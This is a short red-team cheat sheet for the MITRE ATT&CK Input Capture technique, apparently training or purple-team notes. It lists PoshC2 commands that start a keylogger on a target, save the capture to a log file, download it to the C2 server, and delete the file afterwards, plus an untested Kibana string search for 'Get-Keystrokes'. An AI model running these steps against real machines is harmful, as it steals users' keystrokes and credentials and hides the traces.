# [Input Capture](https://attack.mitre.org/techniques/T1056/)

## Exploit Description: 
Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).
---

## Exploit syntax:
In Poshc2, Run
```sh
start-keystrokes 
##Starts the Keylogger

start-keystrokes-writefile 
##record this file location(.log)

### Keylogger is now running until Stopped ###

Download-file "C:\keylogname.log" 
## Gets put into /var/poshc2/*projectname*/downloads

Stop-Keystrokes 
##Stop keylogger for cleanup

posh-delete C:\<same place with new filename> 
##Cleaning up file created
```
---

## Detection Technique:
* (Kibana): Utilized string searches. (“Get-Keystrokes”) --- NOT TESTED IN KIBANA